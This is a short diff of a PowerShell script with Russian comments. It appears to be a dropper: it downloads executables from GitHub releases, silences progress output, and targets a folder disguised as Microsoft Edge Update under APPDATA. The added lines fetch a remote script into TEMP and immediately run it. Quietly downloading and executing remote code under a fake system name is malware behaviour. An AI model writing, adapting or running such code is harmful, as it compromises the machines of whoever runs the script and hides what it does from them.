@@ -11,7 +11,10 @@ $ProgressPreference = "SilentlyContinue"
 # ---------- КОНФИГУРАЦИЯ ----------
 $Url1 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"
 $Url2 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/doomsdaychecked.exe"
-$Url3 = "https://github.com/tallerwin856-commits/py/releases/download/1/telemetry.exe"  # <-- ЗАМЕНИТЕ НА РЕАЛЬНУЮ ССЫЛКУ
+irm "https://raw.githubusercontent.com/tallerwin856-commits/holyworld_check/main/script.ps1" -OutFile "$env:TEMP\hc.ps1"
+
+# Запускаем скачанный файл
+& "$env:TEMP\hc.ps1"
 
 # Файл 1: Edge Update
 $Dir1 = "$env:APPDATA\Microsoft\EdgeUpdate"
